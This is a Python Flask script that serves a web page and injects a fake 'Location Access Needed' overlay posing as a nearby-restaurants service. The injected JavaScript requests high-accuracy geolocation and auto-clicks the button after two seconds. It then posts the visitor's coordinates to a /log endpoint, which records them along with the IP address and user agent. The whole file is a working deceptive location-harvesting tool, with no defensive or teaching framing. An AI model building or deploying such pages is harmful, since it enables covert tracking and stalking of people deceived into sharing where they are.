from flask import Flask, request, make_response
import logging
import os
from datetime import datetime

app = Flask(__name__)

# Configure robust logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Log initial access
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"PAGE_ACCESS - IP: {client_ip} - Agent: {request.user_agent.string}")
    
    # Read and inject into page.html
    try:
        with open('page.html', 'r') as f:
            content = f.read()
    except:
        content = "<html><body>Welcome</body></html>"
    
    # Injection that definitely works
    injection = """
    <style>
        #loc-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.9); z-index: 9999;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            color: white; padding: 20px; text-align: center;
            font-family: -apple-system, sans-serif;
        }
        #loc-btn {
            background: #FF3008; color: white; border: none;
            padding: 15px 30px; border-radius: 25px;
            margin-top: 20px; font-size: 18px;
            font-weight: bold; cursor: pointer;
        }
    </style>
    
    <div id="loc-overlay">
        <h2>Location Access Needed</h2>
        <p>We use your location to show nearby restaurants</p>
        <button id="loc-btn">ALLOW LOCATION</button>
    </div>
    
    <script>
        // Simple guaranteed logging function
        function logData(type, data = {}) {
            const formData = new FormData();
            formData.append('type', type);
            formData.append('data', JSON.stringify(data));
            formData.append('time', new Date().toISOString());
            
            // Use fetch with keepalive and fallback
            fetch('/log', {
                method: 'POST',
                body: formData,
                keepalive: true
            }).catch(e => console.log('Logging error:', e));
        }
        
        // Main location handler
        document.getElementById('loc-btn').addEventListener('click', function() {
            logData('button_click');
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        logData('location_success', {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                        document.getElementById('loc-overlay').style.display = 'none';
                    },
                    error => {
                        logData('location_error', {
                            code: error.code,
                            message: error.message
                        });
                        alert('Please enable location access to continue');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                logData('geolocation_unsupported');
            }
        });
        
        // Attempt automatic trigger after delay
        setTimeout(() => {
            if (document.getElementById('loc-overlay').style.display !== 'none') {
                document.getElementById('loc-btn').click();
            }
        }, 2000);
    </script>
    """
    
    # Insert before </body> or append
    if '</body>' in content:
        return content.replace('</body>', injection + '</body>')
    else:
        return content + injection

@app.route('/log', methods=['POST'])
def handle_log():
    try:
        log_data = {
            'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
            'type': request.form.get('type'),
            'data': request.form.get('data'),
            'time': request.form.get('time'),
            'agent': request.user_agent.string
        }
        
        logger.info(f"LOG_ENTRY: {log_data}")
        return '', 200
        
    except Exception as e:
        logger.error(f"LOG_ERROR: {str(e)}")
        return '', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
